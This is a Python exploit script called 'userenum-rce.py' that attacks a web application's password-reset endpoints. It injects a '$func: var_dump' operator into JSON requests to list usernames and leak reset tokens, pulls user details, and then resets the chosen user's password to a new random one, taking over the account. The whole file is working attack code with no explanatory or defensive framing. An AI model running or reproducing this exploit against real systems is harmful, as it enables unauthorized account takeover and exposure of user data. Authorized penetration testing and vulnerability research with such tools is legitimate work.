#!/usr/bin/env python3

import json
import re
import requests
import random
import string
import argparse

def usage():
	usage = 'python3 userenum-rce.py -u http://localhost:80/'
	return usage

def arguments():
	parse = argparse.ArgumentParser(usage=usage())
	parse.add_argument('-u', dest='url', help='Site URL e.g http://localhost:80/', type=str, required=True)
	return parse.parse_args()

def test_connection(url):
	try:
		get = requests.get(url)
		if get.status_code == 200:
			print("[+] {} is reachable.".format(url))
		else:
			print("[-] {} is not reachable: Status code {}".format(url, get.status_code))
	except requests.exceptions.RequestException as e:
		raise SystemExit("{} is not reachable: Err {}".format(url, e))

def enumerate_users(url):
	print("[-] Attempting username enumeration.")
	url = url + "/auth/requestreset" # any page that gives you hint if a user exists
	headers = {
		"Content-Type": "application/json"
	}
	data = {"user":{"$func":"var_dump"}}
	req = requests.post(url, data=json.dumps(data), headers=headers)
	pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
	matches = pattern.findall(req.content.decode('utf-8'))
	if matches:
		print("[+] Users found: {}".format(str(matches)))
		return matches
	else:
		print("No users found.")

def check_user(usernames):
	user = input("\n[-] Get user details for: ")
	if user not in usernames:
		print("User does not exist...Exiting")
		exit()
	else:
		return user

def reset_tokens(url):
	print("[+] Finding password reset tokens.")
	url = url + "/auth/resetpassword"
	headers = {
		"Content-Type": "application/json"
	}
	data = {"token":{"$func":"var_dump"}}
	req = requests.post(url, data=json.dumps(data), headers=headers)
	pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
	matches = pattern.findall(req.content.decode('utf-8'))
	if matches:
		print("\t Tokens found: {}".format(str(matches)))
		return matches
	else:
		print("No tokens found.")

def user_details(url, token):
	print("[+] Obtaining user information.")
	url = url + "/auth/newpassword"
	headers = {
		"Content-Type":"application/json"
	}
	userAndtoken = {}
	for t in token:
		data = {"token": t}
		req = requests.post(url, data=json.dumps(data), headers=headers)
		pattern=re.compile(r'(this.user\s*=)([^;]+)', re.I)
		matches = pattern.finditer(req.content.decode('utf-8'))
		for match in matches:
			matches = json.loads(match.group(2))
			if matches:
				print("----- Details -----")
				for key, value in matches.items():
					print("\t", "[*]", key, ":", value)
			else:
				print("No user information found.")
			user = matches['user']
			token = matches['_reset_token']
			userAndtoken[user] = token
			print("----" * 3)
			continue
	return userAndtoken


def password_reset(url, token, user):
	print("[-] Attempting to reset {}'s password".format(user))
	characters = string.ascii_letters + string.digits + string.punctuation
	password = ''.join(random.choice(characters) for i in range(10))
	url = url + "/auth/resetpassword"
	headers = {
		"Content-Type":"application/json"
	}
	data = {"token":token, "password":password}
	req = requests.post(url, data=json.dumps(data), headers=headers)
	if "success" in req.content.decode('utf-8'):
		print("[+] Password updated successfully!")
		print("[+] The new credentials for {} is: \n \t Username: {} \n \t Password: {}".format(user,user,password))


def generate_token(url, user):
	url = url + "/auth/requestreset"
	headers = {
		"Content-Type":"application/json"
	}
	data = {"user": user}
	req = requests.post(url, data=json.dumps(data), headers=headers)

def confirm_prompt(question: str) -> bool:
	reply = None
	while reply not in ("", "y", "n"):
		reply = input("{} (Y/n): ".format(question)).lower()
		if reply == "y":
			return True
		elif reply == "n":
			return False
		else:
			return True


def pw_reset_trigger(details, user, url):
	for key in details:
		if key == user:
			password_reset(url, details[key], key)
		else:
			continue

if __name__ == "__main__":
	args = arguments()
	url = args.url 
	test_connection(url)
	user = check_user(enumerate_users(url))
	generate_token(url, user)
	tokens = reset_tokens(url)
	details = user_details(url, tokens)
	print("\n")
	b = confirm_prompt("[+] Do you want to reset the password for {}.".format(user))
	if b:
		pw_reset_trigger(details, user, url)
	else:
		print("Exiting...")
		exit()











